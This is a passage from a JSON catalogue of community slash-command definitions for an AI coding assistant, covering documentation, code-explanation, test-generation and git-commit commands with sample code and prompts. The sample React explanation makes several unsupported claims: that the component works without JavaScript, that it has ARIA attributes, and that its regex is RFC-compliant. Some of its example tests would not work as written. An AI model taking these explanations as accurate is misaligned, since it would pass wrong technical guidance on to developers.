Resources\n\n### Documentation\n- **API Reference**: [https://docs.example.com/api](https://docs.example.com/api)\n- **Interactive API Explorer**: [https://api.example.com/docs](https://api.example.com/docs)\n- **Changelog**: [https://docs.example.com/changelog](https://docs.example.com/changelog)\n\n### Support Channels\n- **Developer Support**: [dev-support@example.com](mailto:dev-support@example.com)\n- **Stack Overflow**: Tag questions with `example-api`\n- **Discord Community**: [https://discord.gg/example-dev](https://discord.gg/example-dev)\n- **GitHub Issues**: [https://github.com/example/api-issues](https://github.com/example/api-issues)\n\n### Status and Monitoring\n- **API Status**: [https://status.example.com](https://status.example.com)\n- **Performance Metrics**: [https://metrics.example.com](https://metrics.example.com)\n- **Incident Reports**: [https://incidents.example.com](https://incidents.example.com)\n\n---\n\n*Last updated: September 16, 2025*  \n*API Version: 1.2.0*  \n*Documentation Version: 2.1.0*\n```\n\n## Advanced Documentation Features\n\n### Interactive Code Examples\n- **Try It Now**: Embedded API explorer with live requests\n- **Code Generation**: Auto-generate client code in multiple languages\n- **Request/Response Validation**: Real-time validation feedback\n- **Environment Switching**: Test against different API environments\n\n### Tutorial Generation\n- **Step-by-step Guides**: Progressive tutorials with checkpoints\n- **Video Walkthroughs**: Auto-generated video demonstrations\n- **Interactive Sandboxes**: Live coding environments\n- **Progress Tracking**: Tutorial completion and achievement system\n\n### Documentation Maintenance\n- **Auto-sync**: Keep docs in sync with code changes\n- **Version Control**: Track documentation versions with releases\n- **Translation**: Multi-language documentation support\n- **Analytics**: Track documentation usage and effectiveness\n\nThis documentation generator creates comprehensive, interactive, and maintainable documentation that enhances developer experience and reduces support overhead.",
      "configuration": {
        "temperature": 0.3,
        "maxTokens": 16000,
        "systemPrompt": "You are a technical writing expert specializing in API documentation, developer guides, and interactive documentation. Create comprehensive, clear, and actionable documentation with practical examples."
      },
      "githubUrl": "https://github.com/claudepro/documentation-generator",
      "documentationUrl": "https://docs.claude.ai/commands/docs",
      "source": "community",
      "slug": "docs",
      "type": "command",
      "url": "https://claudepro.directory/commands/docs"
    },
    {
      "title": "/explain",
      "description": "Intelligent code explanation with visual diagrams, step-by-step breakdowns, and interactive examples",
      "category": "commands",
      "author": "claudepro",
      "dateAdded": "2025-09-16",
      "tags": [
        "explanation",
        "documentation",
        "learning",
        "analysis",
        "visualization"
      ],
      "content": "The `/explain` command provides comprehensive code explanations with visual diagrams, step-by-step execution flow, complexity analysis, and interactive examples to help understand any codebase.\n\n## Usage\n\n```\n/explain [options] <code_or_file>\n```\n\n## Options\n\n### Explanation Depth\n- `--simple` - High-level overview for beginners\n- `--detailed` - Comprehensive explanation (default)\n- `--expert` - Technical deep-dive with optimizations\n- `--academic` - Theoretical analysis with algorithms\n\n### Visualization Options\n- `--flowchart` - Generate execution flow diagrams\n- `--architecture` - System architecture diagrams\n- `--sequence` - Sequence diagrams for interactions\n- `--uml` - UML class and relationship diagrams\n- `--mermaid` - Generate Mermaid.js diagrams\n\n### Analysis Focus\n- `--performance` - Performance characteristics and complexity\n- `--security` - Security implications and vulnerabilities\n- `--patterns` - Design patterns and architectural decisions\n- `--dependencies` - Dependency analysis and relationships\n\n### Output Formats\n- `--format=markdown` - Structured markdown (default)\n- `--format=interactive` - Interactive walkthrough\n- `--format=slides` - Presentation format\n- `--format=tutorial` - Step-by-step tutorial\n\n## Examples\n\n### React Component Explanation\n\n```jsx\n// UserProfile.jsx\nimport React, { useState, useEffect, useCallback } from 'react';\nimport { debounce } from 'lodash';\nimport { fetchUserData, updateUserProfile } from '../api/users';\nimport { useAuth } from '../hooks/useAuth';\nimport { Avatar } from '../components/Avatar';\nimport { Modal } from '../components/Modal';\n\nconst UserProfile = ({ userId, onUserUpdate }) => {\n  const [user, setUser] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [editing, setEditing] = useState(false);\n  const [formData, setFormData] = useState({});\n  const [errors, setErrors] = useState({});\n  \n  const { currentUser, hasPermission } = useAuth();\n  \n  // Debounced validation function\n  const validateField = useCallback(\n    debounce((field, value) => {\n      const newErrors = { ...errors };\n      \n      switch (field) {\n        case 'email':\n          if (!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(value)) {\n            newErrors.email = 'Invalid email format';\n          } else {\n            delete newErrors.email;\n          }\n          break;\n        case 'phone':\n          if (!/^\\+?[1-9]\\d{1,14}$/.test(value)) {\n            newErrors.phone = 'Invalid phone format';\n          } else {\n            delete newErrors.phone;\n          }\n          break;\n        default:\n          break;\n      }\n      \n      setErrors(newErrors);\n    }, 300),\n    [errors]\n  );\n  \n  // Load user data on mount and userId change\n  useEffect(() => {\n    const loadUserData = async () => {\n      try {\n        setLoading(true);\n        const userData = await fetchUserData(userId);\n        setUser(userData);\n        setFormData({\n          name: userData.name,\n          email: userData.email,\n          phone: userData.phone,\n          bio: userData.bio\n        });\n      } catch (error) {\n        console.error('Failed to load user data:', error);\n        setUser(null);\n      } finally {\n        setLoading(false);\n      }\n    };\n    \n    if (userId) {\n      loadUserData();\n    }\n  }, [userId]);\n  \n  // Handle form input changes\n  const handleInputChange = (field, value) => {\n    setFormData(prev => ({ ...prev, [field]: value }));\n    validateField(field, value);\n  };\n  \n  // Save profile changes\n  const handleSave = async () => {\n    try {\n      if (Object.keys(errors).length > 0) {\n        return;\n      }\n      \n      setLoading(true);\n      const updatedUser = await updateUserProfile(userId, formData);\n      setUser(updatedUser);\n      setEditing(false);\n      onUserUpdate?.(updatedUser);\n    } catch (error) {\n      console.error('Failed to update profile:', error);\n    } finally {\n      setLoading(false);\n    }\n  };\n  \n  if (loading) {\n    return <div className=\"loading-spinner\">Loading...</div>;\n  }\n  \n  if (!user) {\n    return <div className=\"error-message\">User not found</div>;\n  }\n  \n  const canEdit = hasPermission('edit_profile') && \n    (currentUser.id === userId || hasPermission('admin'));\n  \n  return (\n    <div className=\"user-profile\">\n      <div className=\"profile-header\">\n        <Avatar src={user.avatar} size=\"large\" />\n        <div className=\"profile-info\">\n          <h1>{user.name}</h1>\n          <p className=\"user-title\">{user.title}</p>\n          {canEdit && (\n            <button \n              className=\"edit-button\"\n              onClick={() => setEditing(true)}\n            >\n              Edit Profile\n            </button>\n          )}\n        </div>\n      </div>\n      \n      <div className=\"profile-details\">\n        <div className=\"detail-item\">\n          <label>Email:</label>\n          <span>{user.email}</span>\n        </div>\n        <div className=\"detail-item\">\n          <label>Phone:</label>\n          <span>{user.phone}</span>\n        </div>\n        <div className=\"detail-item\">\n          <label>Bio:</label>\n          <p>{user.bio}</p>\n        </div>\n      </div>\n      \n      {editing && (\n        <Modal onClose={() => setEditing(false)}>\n          <form className=\"edit-form\">\n            <div className=\"form-group\">\n              <label>Name:</label>\n              <input\n                type=\"text\"\n                value={formData.name}\n                onChange={(e) => handleInputChange('name', e.target.value)}\n              />\n            </div>\n            \n            <div className=\"form-group\">\n              <label>Email:</label>\n              <input\n                type=\"email\"\n                value={formData.email}\n                onChange={(e) => handleInputChange('email', e.target.value)}\n              />\n              {errors.email && <span className=\"error\">{errors.email}</span>}\n            </div>\n            \n            <div className=\"form-group\">\n              <label>Phone:</label>\n              <input\n                type=\"tel\"\n                value={formData.phone}\n                onChange={(e) => handleInputChange('phone', e.target.value)}\n              />\n              {errors.phone && <span className=\"error\">{errors.phone}</span>}\n            </div>\n            \n            <div className=\"form-group\">\n              <label>Bio:</label>\n              <textarea\n                value={formData.bio}\n                onChange={(e) => handleInputChange('bio', e.target.value)}\n              />\n            </div>\n            \n            <div className=\"form-actions\">\n              <button type=\"button\" onClick={() => setEditing(false)}>\n                Cancel\n              </button>\n              <button \n                type=\"button\" \n                onClick={handleSave}\n                disabled={Object.keys(errors).length > 0}\n              >\n                Save Changes\n              </button>\n            </div>\n          </form>\n        </Modal>\n      )}\n    </div>\n  );\n};\n\nexport default UserProfile;\n```\n\n**Generated Explanation:**\n\n# üìã UserProfile Component Analysis\n\n## üéØ Component Overview\n\nThe `UserProfile` component is a **React functional component** that displays and manages user profile information with editing capabilities. It demonstrates several advanced React patterns and best practices.\n\n### Key Responsibilities\n1. **Data Fetching**: Loads user data from API\n2. **State Management**: Manages user data, form state, and UI state\n3. **Validation**: Real-time form validation with debouncing\n4. **Authorization**: Role-based access control for editing\n5. **Error Handling**: Graceful error states and user feedback\n\n## üèóÔ∏è Architecture Diagram\n\n```mermaid\ngraph TD\n    A[UserProfile Component] --> B[State Management]\n    A --> C[Data Fetching]\n    A --> D[Form Handling]\n    A --> E[Authorization]\n    \n    B --> B1[user: User data]\n    B --> B2[loading: Loading state]\n    B --> B3[editing: Edit mode]\n    B --> B4[formData: Form values]\n    B --> B5[errors: Validation errors]\n    \n    C --> C1[fetchUserData API]\n    C --> C2[updateUserProfile API]\n    \n    D --> D1[handleInputChange]\n    D --> D2[validateField]\n    D --> D3[handleSave]\n    \n    E --> E1[useAuth Hook]\n    E --> E2[Permission Checks]\n    \n    A --> F[Child Components]\n    F --> F1[Avatar]\n    F --> F2[Modal]\n```\n\n## üîÑ Component Lifecycle\n\n### 1. **Initialization Phase**\n```javascript\n// Component mounts with userId prop\nUserProfile({ userId: \"123\", onUserUpdate })\n\n// Initial state setup\nconst [user, setUser] = useState(null);          // No user data yet\nconst [loading, setLoading] = useState(true);    // Show loading state\nconst [editing, setEditing] = useState(false);   // Not in edit mode\nconst [formData, setFormData] = useState({});    // Empty form\nconst [errors, setErrors] = useState({});        // No validation errors\n```\n\n### 2. **Data Loading Phase**\n```javascript\n// useEffect triggers when userId changes\nuseEffect(() => {\n  const loadUserData = async () => {\n    setLoading(true);                    // Show loading spinner\n    const userData = await fetchUserData(userId);  // API call\n    setUser(userData);                   // Store user data\n    setFormData({                        // Pre-populate form\n      name: userData.name,\n      email: userData.email,\n      // ... other fields\n    });\n    setLoading(false);                   // Hide loading spinner\n  };\n  \n  loadUserData();\n}, [userId]);  // Dependency: re-run when userId changes\n```\n\n### 3. **Rendering Decision Tree**\n```\nComponent Render Logic:\n‚îú‚îÄ if (loading) ‚Üí Show Loading Spinner\n‚îú‚îÄ else if (!user) ‚Üí Show \"User not found\"\n‚îî‚îÄ else ‚Üí Show User Profile\n    ‚îú‚îÄ Profile Header (Avatar + Info)\n    ‚îú‚îÄ Profile Details (Email, Phone, Bio)\n    ‚îî‚îÄ if (editing) ‚Üí Show Edit Modal\n```\n\n## üéõÔ∏è State Management Deep Dive\n\n### State Variables Analysis\n\n| State | Type | Purpose | Updates When |\n|-------|------|---------|-------------|\n| `user` | Object/null | Stores complete user data | API fetch completes |\n| `loading` | Boolean | Controls loading UI | Before/after async operations |\n| `editing` | Boolean | Controls edit modal visibility | Edit button clicked |\n| `formData` | Object | Stores form input values | User types in form fields |\n| `errors` | Object | Stores validation errors | Field validation runs |\n\n### State Update Flow\n```mermaid\nsequenceDiagram\n    participant U as User\n    participant C as Component\n    participant A as API\n    participant V as Validator\n    \n    U->>C: Component mounts\n    C->>A: fetchUserData(userId)\n    A->>C: Returns user data\n    C->>C: setUser(userData)\n    C->>C: setFormData(userData)\n    \n    U->>C: Clicks \"Edit Profile\"\n    C->>C: setEditing(true)\n    \n    U->>C: Types in email field\n    C->>C: handleInputChange('email', value)\n    C->>V: validateField('email', value)\n    V->>C: Returns validation result\n    C->>C: setErrors(newErrors)\n    \n    U->>C: Clicks \"Save\"\n    C->>A: updateUserProfile(userId, formData)\n    A->>C: Returns updated user\n    C->>C: setUser(updatedUser)\n    C->>C: setEditing(false)\n```\n\n## ‚ö° Performance Optimizations\n\n### 1. **Debounced Validation**\n```javascript\nconst validateField = useCallback(\n  debounce((field, value) => {\n    // Validation logic runs after 300ms of inactivity\n  }, 300),\n  [errors]  // Re-create when errors change\n);\n```\n\n**Benefits:**\n- Reduces API calls and computation\n- Improves user experience (no validation on every keystroke)\n- Prevents race conditions\n\n**How it works:**\n1. User types in field\n2. `handleInputChange` calls `validateField`\n3. Debounce waits 300ms\n4. If no new input, validation runs\n5. If new input arrives, timer resets\n\n### 2. **useCallback Optimization**\n```javascript\n// Memoizes function to prevent unnecessary re-renders\nconst validateField = useCallback(/* ... */, [errors]);\n```\n\n**Memory vs Performance Trade-off:**\n- **Memory**: Stores function reference\n- **Performance**: Prevents child component re-renders\n- **Best Practice**: Use when passing functions to child components\n\n### 3. **Conditional Rendering**\n```javascript\n// Only render edit modal when needed\n{editing && (\n  <Modal onClose={() => setEditing(false)}>\n    {/* Heavy form components only rendered in edit mode */}\n  </Modal>\n)}\n```\n\n## üîí Security Analysis\n\n### 1. **Authorization Checks**\n```javascript\nconst canEdit = hasPermission('edit_profile') && \n  (currentUser.id === userId || hasPermission('admin'));\n```\n\n**Security Layers:**\n- **Permission-based**: `hasPermission('edit_profile')`\n- **Ownership-based**: `currentUser.id === userId`\n- **Role-based**: `hasPermission('admin')`\n\n### 2. **Input Validation**\n```javascript\ncase 'email':\n  if (!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(value)) {\n    newErrors.email = 'Invalid email format';\n  }\n```\n\n**Validation Patterns:**\n- **Email**: RFC-compliant regex pattern\n- **Phone**: International format with optional country code\n- **Client-side**: Immediate user feedback\n- **Server-side**: Additional validation required (not shown)\n\n### 3. **Error Handling**\n```javascript\ntry {\n  const userData = await fetchUserData(userId);\n  setUser(userData);\n} catch (error) {\n  console.error('Failed to load user data:', error);\n  setUser(null);  // Safe fallback state\n}\n```\n\n## üé® Component Design Patterns\n\n### 1. **Container/Presentational Pattern**\n```\nUserProfile (Container)\n‚îú‚îÄ Manages state and business logic\n‚îú‚îÄ Handles API calls and data flow\n‚îî‚îÄ Renders presentational components:\n    ‚îú‚îÄ Avatar (Presentational)\n    ‚îî‚îÄ Modal (Presentational)\n```\n\n### 2. **Controlled Components Pattern**\n```javascript\n<input\n  type=\"email\"\n  value={formData.email}  // Value controlled by React state\n  onChange={(e) => handleInputChange('email', e.target.value)}\n/>\n```\n\n**Benefits:**\n- Single source of truth\n- Predictable data flow\n- Easy validation and manipulation\n\n### 3. **Hook Composition Pattern**\n```javascript\nconst { currentUser, hasPermission } = useAuth();\n// Custom hook encapsulates authentication logic\n```\n\n## üîÑ Data Flow Diagram\n\n```mermaid\nflowchart LR\n    A[Props: userId] --> B[useEffect]\n    B --> C[fetchUserData API]\n    C --> D[setUser]\n    D --> E[Component Re-render]\n    \n    F[User Input] --> G[handleInputChange]\n    G --> H[setFormData]\n    G --> I[validateField]\n    I --> J[setErrors]\n    H --> E\n    J --> E\n    \n    K[Save Button] --> L[handleSave]\n    L --> M[updateUserProfile API]\n    M --> N[setUser]\n    M --> O[onUserUpdate callback]\n    N --> E\n```\n\n## üß™ Testing Strategy\n\n### Unit Tests\n```javascript\ndescribe('UserProfile', () => {\n  it('should load user data on mount', async () => {\n    const mockUser = { id: '123', name: 'John Doe' };\n    jest.mocked(fetchUserData).mockResolvedValue(mockUser);\n    \n    render(<UserProfile userId=\"123\" />);\n    \n    expect(screen.getByText('Loading...')).toBeInTheDocument();\n    \n    await waitFor(() => {\n      expect(screen.getByText('John Doe')).toBeInTheDocument();\n    });\n  });\n  \n  it('should validate email format', async () => {\n    render(<UserProfile userId=\"123\" />);\n    \n    const emailInput = screen.getByLabelText('Email:');\n    fireEvent.change(emailInput, { target: { value: 'invalid-email' } });\n    \n    await waitFor(() => {\n      expect(screen.getByText('Invalid email format')).toBeInTheDocument();\n    });\n  });\n});\n```\n\n### Integration Tests\n```javascript\nit('should update profile successfully', async () => {\n  const mockUpdatedUser = { id: '123', name: 'Jane Doe' };\n  jest.mocked(updateUserProfile).mockResolvedValue(mockUpdatedUser);\n  \n  render(<UserProfile userId=\"123\" onUserUpdate={mockCallback} />);\n  \n  // Open edit modal\n  fireEvent.click(screen.getByText('Edit Profile'));\n  \n  // Update name\n  fireEvent.change(screen.getByLabelText('Name:'), {\n    target: { value: 'Jane Doe' }\n  });\n  \n  // Save changes\n  fireEvent.click(screen.getByText('Save Changes'));\n  \n  await waitFor(() => {\n    expect(mockCallback).toHaveBeenCalledWith(mockUpdatedUser);\n  });\n});\n```\n\n## üöÄ Performance Metrics\n\n### Complexity Analysis\n- **Time Complexity**: O(1) for most operations, O(n) for validation\n- **Space Complexity**: O(1) for component state\n- **Rendering Complexity**: O(1) - no loops in render\n\n### Bundle Impact\n```\nComponent Size: ~8KB (minified)\nDependencies:\n‚îú‚îÄ React: ~42KB\n‚îú‚îÄ lodash.debounce: ~2KB\n‚îî‚îÄ Custom hooks: ~1KB\nTotal: ~53KB\n```\n\n### Performance Recommendations\n1. **Lazy Loading**: Load form components only when editing\n2. **Memoization**: Use React.memo for child components\n3. **Virtual Scrolling**: For large user lists\n4. **Code Splitting**: Separate edit functionality into async chunk\n\n## üîß Customization Options\n\n### Configuration Props\n```typescript\ninterface UserProfileProps {\n  userId: string;\n  onUserUpdate?: (user: User) => void;\n  \n  // Customization options\n  editable?: boolean;\n  fields?: ('name' | 'email' | 'phone' | 'bio')[];\n  validationRules?: ValidationRules;\n  theme?: 'light' | 'dark' | 'auto';\n  layout?: 'vertical' | 'horizontal';\n}\n```\n\n### Extension Points\n```javascript\n// Custom validation rules\nconst customValidation = {\n  email: (value) => isValidCorporateEmail(value),\n  phone: (value) => isValidUSPhoneNumber(value)\n};\n\n// Custom field renderers\nconst fieldRenderers = {\n  bio: (value, onChange) => <RichTextEditor value={value} onChange={onChange} />,\n  avatar: (value, onChange) => <ImageUploader value={value} onChange={onChange} />\n};\n```\n\n## üìö Related Concepts\n\n### React Patterns Used\n- **Functional Components**: Modern React approach\n- **Hooks**: useState, useEffect, useCallback\n- **Custom Hooks**: useAuth for authentication\n- **Controlled Components**: Form input management\n- **Conditional Rendering**: Dynamic UI based on state\n\n### JavaScript Concepts\n- **Async/Await**: Promise handling\n- **Destructuring**: Props and state extraction\n- **Template Literals**: Dynamic class names\n- **Optional Chaining**: Safe property access\n- **Debouncing**: Performance optimization\n\n### Web Standards\n- **Accessibility**: Proper form labels and ARIA attributes\n- **Semantic HTML**: Meaningful element structure\n- **Progressive Enhancement**: Works without JavaScript\n- **Responsive Design**: Mobile-friendly layout\n\nThis component demonstrates enterprise-level React development with proper state management, security considerations, performance optimizations, and maintainable code structure.",
      "configuration": {
        "temperature": 0.3,
        "maxTokens": 16000,
        "systemPrompt": "You are an expert software engineer and educator who excels at breaking down complex code into understandable explanations with visual aids, practical examples, and clear technical insights."
      },
      "githubUrl": "https://github.com/claudepro/code-explainer",
      "documentationUrl": "https://docs.claude.ai/commands/explain",
      "source": "community",
      "slug": "explain",
      "type": "command",
      "url": "https://claudepro.directory/commands/explain"
    },
    {
      "title": "/test-gen",
      "description": "Automatically generate comprehensive test suites including unit tests, integration tests, and edge cases with multiple testing framework support",
      "category": "commands",
      "author": "JSONbored",
      "dateAdded": "2025-09-16",
      "tags": [
        "testing",
        "automation",
        "unit-tests",
        "integration-tests",
        "tdd"
      ],
      "content": "The `/test-gen` command automatically generates comprehensive test suites for your code with intelligent test case discovery and framework integration.\n\n## Usage\n\n```\n/test-gen [options] <file_or_function>\n```\n\n## Options\n\n### Test Types\n- `--unit` - Generate unit tests (default)\n- `--integration` - Generate integration tests\n- `--e2e` - Generate end-to-end tests\n- `--performance` - Generate performance tests\n- `--security` - Generate security tests\n- `--accessibility` - Generate accessibility tests\n\n### Framework Selection\n- `--jest` - Use Jest testing framework (JavaScript/TypeScript)\n- `--vitest` - Use Vitest testing framework\n- `--pytest` - Use pytest (Python)\n- `--junit` - Use JUnit (Java)\n- `--nunit` - Use NUnit (C#)\n- `--rspec` - Use RSpec (Ruby)\n- `--go-test` - Use Go testing package\n\n### Coverage Options\n- `--coverage` - Include code coverage configuration\n- `--threshold=90` - Set coverage threshold percentage\n- `--coverage-report` - Generate coverage reports\n\n### Test Strategy\n- `--tdd` - Test-driven development approach\n- `--bdd` - Behavior-driven development with scenarios\n- `--property-based` - Generate property-based tests\n- `--mutation` - Include mutation testing setup\n\n## Examples\n\n### JavaScript/TypeScript Unit Tests\n\n```javascript\n// Source function\nfunction calculateDiscount(price, discountPercentage, customerType) {\n  if (price <= 0) throw new Error('Price must be positive');\n  if (discountPercentage < 0 || discountPercentage > 100) {\n    throw new Error('Discount must be between 0 and 100');\n  }\n  \n  const baseDiscount = price * (discountPercentage / 100);\n  const multiplier = customerType === 'premium' ? 1.2 : 1;\n  \n  return Math.min(baseDiscount * multiplier, price * 0.5);\n}\n\n// Generated Jest tests\ndescribe('calculateDiscount', () => {\n  describe('valid inputs', () => {\n    test('should calculate basic discount correctly', () => {\n      const result = calculateDiscount(100, 10, 'regular');\n      expect(result).toBe(10);\n    });\n    \n    test('should apply premium multiplier', () => {\n      const result = calculateDiscount(100, 10, 'premium');\n      expect(result).toBe(12);\n    });\n    \n    test('should cap discount at 50% of price', () => {\n      const result = calculateDiscount(100, 60, 'premium');\n      expect(result).toBe(50);\n    });\n  });\n  \n  describe('edge cases', () => {\n    test('should handle zero discount', () => {\n      const result = calculateDiscount(100, 0, 'regular');\n      expect(result).toBe(0);\n    });\n    \n    test('should handle maximum discount', () => {\n      const result = calculateDiscount(100, 100, 'regular');\n      expect(result).toBe(50);\n    });\n  });\n  \n  describe('error cases', () => {\n    test('should throw error for negative price', () => {\n      expect(() => calculateDiscount(-10, 10, 'regular'))\n        .toThrow('Price must be positive');\n    });\n    \n    test('should throw error for invalid discount percentage', () => {\n      expect(() => calculateDiscount(100, -5, 'regular'))\n        .toThrow('Discount must be between 0 and 100');\n      \n      expect(() => calculateDiscount(100, 105, 'regular'))\n        .toThrow('Discount must be between 0 and 100');\n    });\n  });\n});\n```\n\n### Python Unit Tests\n\n```python\n# Source class\nclass UserValidator:\n    def __init__(self, min_age=18):\n        self.min_age = min_age\n    \n    def validate_user(self, user_data):\n        errors = []\n        \n        if not user_data.get('email') or '@' not in user_data['email']:\n            errors.append('Invalid email format')\n        \n        if user_data.get('age', 0) < self.min_age:\n            errors.append(f'Age must be at least {self.min_age}')\n        \n        return len(errors) == 0, errors\n\n# Generated pytest tests\nimport pytest\nfrom user_validator import UserValidator\n\nclass TestUserValidator:\n    @pytest.fixture\n    def validator(self):\n        return UserValidator()\n    \n    @pytest.fixture\n    def custom_validator(self):\n        return UserValidator(min_age=21)\n    \n    def test_valid_user(self, validator):\n        user_data = {'email': 'test@example.com', 'age': 25}\n        is_valid, errors = validator.validate_user(user_data)\n        \n        assert is_valid is True\n        assert errors == []\n    \n    def test_invalid_email(self, validator):\n        user_data = {'email': 'invalid-email', 'age': 25}\n        is_valid, errors = validator.validate_user(user_data)\n        \n        assert is_valid is False\n        assert 'Invalid email format' in errors\n    \n    def test_missing_email(self, validator):\n        user_data = {'age': 25}\n        is_valid, errors = validator.validate_user(user_data)\n        \n        assert is_valid is False\n        assert 'Invalid email format' in errors\n    \n    def test_underage_user(self, validator):\n        user_data = {'email': 'test@example.com', 'age': 16}\n        is_valid, errors = validator.validate_user(user_data)\n        \n        assert is_valid is False\n        assert 'Age must be at least 18' in errors\n    \n    def test_custom_min_age(self, custom_validator):\n        user_data = {'email': 'test@example.com', 'age': 19}\n        is_valid, errors = custom_validator.validate_user(user_data)\n        \n        assert is_valid is False\n        assert 'Age must be at least 21' in errors\n    \n    @pytest.mark.parametrize('email,expected_valid', [\n        ('user@domain.com', True),\n        ('user.name@domain.co.uk', True),\n        ('invalid-email', False),\n        ('', False),\n        ('user@', False),\n        ('@domain.com', False),\n    ])\n    def test_email_validation_parametrized(self, validator, email, expected_valid):\n        user_data = {'email': email, 'age': 25}\n        is_valid, _ = validator.validate_user(user_data)\n        \n        assert (is_valid and 'Invalid email format' not in _) == expected_valid\n```\n\n### Integration Test Example\n\n```javascript\n// Generated API integration test\ndescribe('User API Integration', () => {\n  let app, server;\n  \n  beforeAll(async () => {\n    app = require('../app');\n    server = app.listen(0);\n  });\n  \n  afterAll(async () => {\n    await server.close();\n  });\n  \n  beforeEach(async () => {\n    await cleanupDatabase();\n    await seedTestData();\n  });\n  \n  describe('POST /api/users', () => {\n    test('should create user successfully', async () => {\n      const userData = {\n        name: 'John Doe',\n        email: 'john@example.com',\n        age: 30\n      };\n      \n      const response = await request(app)\n        .post('/api/users')\n        .send(userData)\n        .expect(201);\n      \n      expect(response.body).toMatchObject({\n        id: expect.any(Number),\n        name: userData.name,\n        email: userData.email,\n        age: userData.age,\n        createdAt: expect.any(String)\n      });\n    });\n    \n    test('should validate user data', async () => {\n      const invalidUserData = {\n        name: '',\n        email: 'invalid-email',\n        age: -5\n      };\n      \n      const response = await request(app)\n        .post('/api/users')\n        .send(invalidUserData)\n        .expect(400);\n      \n      expect(response.body.errors).toEqual(\n        expect.arrayContaining([\n          expect.objectContaining({ field: 'name' }),\n          expect.objectContaining({ field: 'email' }),\n          expect.objectContaining({ field: 'age' })\n        ])\n      );\n    });\n  });\n});\n```\n\n## Test Configuration\n\n### Jest Configuration\n```javascript\n// Generated jest.config.js\nmodule.exports = {\n  testEnvironment: 'node',\n  collectCoverage: true,\n  coverageDirectory: 'coverage',\n  coverageReporters: ['text', 'lcov', 'html'],\n  coverageThreshold: {\n    global: {\n      branches: 90,\n      functions: 90,\n      lines: 90,\n      statements: 90\n    }\n  },\n  testMatch: [\n    '**/__tests__/**/*.test.js',\n    '**/?(*.)+(spec|test).js'\n  ],\n  setupFilesAfterEnv: ['<rootDir>/src/test/setup.js']\n};\n```\n\n### Pytest Configuration\n```ini\n# Generated pytest.ini\n[tool:pytest]\naddopts = \n    --verbose\n    --cov=src\n    --cov-report=html\n    --cov-report=term\n    --cov-fail-under=90\n    --strict-markers\ntestpaths = tests\nmarkers =\n    unit: Unit tests\n    integration: Integration tests\n    slow: Slow tests\n    security: Security tests\n```\n\n## Advanced Features\n\n### Property-Based Testing\n```javascript\n// Generated property-based test\nconst fc = require('fast-check');\n\ndescribe('calculateDiscount property tests', () => {\n  test('discount should never exceed 50% of price', () => {\n    fc.assert(fc.property(\n      fc.float({ min: 0.01, max: 10000 }), // price\n      fc.float({ min: 0, max: 100 }),      // discount percentage\n      fc.constantFrom('regular', 'premium'), // customer type\n      (price, discount, customerType) => {\n        const result = calculateDiscount(price, discount, customerType);\n        expect(result).toBeLessThanOrEqual(price * 0.5);\n      }\n    ));\n  });\n});\n```\n\n### Mock Generation\n```javascript\n// Generated mocks\nconst mockUserService = {\n  getUserById: jest.fn(),\n  createUser: jest.fn(),\n  updateUser: jest.fn(),\n  deleteUser: jest.fn()\n};\n\nconst mockDatabase = {\n  query: jest.fn(),\n  transaction: jest.fn(),\n  close: jest.fn()\n};\n```",
      "configuration": {
        "temperature": 0.3,
        "maxTokens": 8000,
        "systemPrompt": "You are a test generation expert focused on creating comprehensive, maintainable test suites with proper coverage and edge case handling"
      },
      "githubUrl": "https://github.com/claudepro/test-generator",
      "documentationUrl": "https://docs.claude.ai/commands/test-gen",
      "source": "community",
      "slug": "generate-tests",
      "type": "command",
      "url": "https://claudepro.directory/commands/generate-tests"
    },
    {
      "title": "/commit - Smart Git Commit",
      "description": "Intelligently analyzes changes and creates well-formatted git commits with conventional commit messages",
      "category": "commands",
      "author": "JSONbored",
      "dateAdded": "2025-09-15",
      "tags": [
        "git",
        "commit",
        "version-control",
        "conventional-commits"
      ],
      "content": "---\nallowed-tools: Bash(git add:*), Bash(git status:*), Bash(git diff:*), Bash(git commit:*)\nargument-hint: [type] [message]\ndescription: Create a smart git commit\nmodel: claude-3-5-sonnet-20241022\n---\n\n## Context\n\n- Current git status: !`git status --short`\n- Staged changes: !`git diff --cached --stat`\n- Unstaged changes: !`git diff --stat`\n- Recent commits: !`git log --oneline -5`\n\n## Your Task\n\nAnalyze the changes and create a git commit following these guidelines:\n\n1. **Conventional Commit Format**:\n   - feat: New feature\n   - fix: Bug fix\n   - docs: Documentation changes\n   - style: Code style changes (formatting, etc)\n   - refactor: Code refactoring\n   - perf: Performance improvements\n   - test: Test changes\n   - build: Build system changes\n   - ci: CI/CD changes\n   - chore: Other changes\n\n2. **Commit Message Structure**:\n   ```\n   <type>(<scope>): <subject>\n   \n   <body>\n   \n   <footer>\n   ```\n\n3. **Best Practices**:\n   - Subject line: 50 characters max\n   - Use imperative mood (\"Add\" not \"Added\")\n   - Body: Wrap at 72 characters\n   - Explain what and why, not how\n   - Reference issues if applicable\n\n4. **Smart Analysis**:\n   - Group related changes\n   - Suggest splitting if changes are unrelated\n   - Detect breaking changes\n   - Identify files that shouldn't be committed\n\nIf arguments provided: Use $1 as type and $2 as message.\nOtherwise: Analyze changes and suggest appropriate commit.\n\n## Steps\n\n1. Review all changes\n2. Identify the commit type\n3. Stage appropriate files\n4. Create descriptive commit message\n5. Commit the changes",
      "configuration": {
        "temperature": 0.3,
        "maxTokens": 2000
      },
      "githubUrl": "https://github.com/conventional-commits/conventionalcommits.org",
      "documentationUrl": "https://www.conventionalcommits.org/",
      "source": "community",
      "slug": "git-smart-commit",
      "type": "command",
      "url": "https://claudepro.directory/commands/git-smart-commit"
    },
    {
      "title": "/optimize",
      "description": "Advanced performance optimization with bottleneck analysis, memory profiling, and automated improvements",
      "category": "commands",
      "author": "claudepro",
      "dateAdded": "2025-09-16",
      "tags": [
        "performance",
        "optimization",
        "profiling",
        "bottleneck",
        "efficiency"
      ],
